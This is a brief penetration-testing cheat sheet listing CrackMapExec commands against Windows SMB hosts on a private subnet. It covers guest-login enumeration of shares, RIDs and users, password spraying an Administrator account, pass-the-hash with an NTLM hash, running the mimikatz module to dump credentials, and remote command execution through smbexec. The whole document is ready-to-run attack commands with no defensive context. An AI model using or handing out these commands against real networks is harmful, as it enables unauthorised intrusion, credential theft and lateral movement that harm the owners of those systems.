# POPULAR LIL DOODIES
```
crackmapexec -u 'guest' -p '' --shares 192.168.1.23
crackmapexec -u 'guest' -p '' --rid-brute 4000 192.168.1.23
crackmapexec -u 'guest' -p '' --users 192.168.1.23

crackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rd
crackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B

crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.0/24
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 192.168.1.23
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 192.168.1.23 # reliable pth code execution
```
